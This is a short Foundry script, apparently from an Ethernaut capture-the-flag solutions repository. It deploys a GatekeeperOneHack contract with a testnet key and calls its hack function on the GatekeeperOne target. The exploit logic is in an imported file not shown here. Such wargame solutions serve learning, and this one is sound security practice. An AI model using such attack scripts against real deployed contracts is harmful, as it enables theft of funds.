// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {GatekeeperOneHack} from "src/hack/GatekeeperOneHack.sol";
import {IGatekeeperOne} from "src/hack/interfaces/IGatekeeperOne.sol";

// Gas used 554973

contract GatekeeperOneScript is Script {
    error HackFailed();

    function run() external {
        address gatekeeperOneAddress = vm.envAddress("GATEKEEPER_ONE_ADDRESS");
        uint256 attackerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");
        vm.startBroadcast(attackerKey);
        GatekeeperOneHack gatekeeperOneHack = new GatekeeperOneHack();
        gatekeeperOneHack.hack(gatekeeperOneAddress);
        vm.stopBroadcast();
    }
}
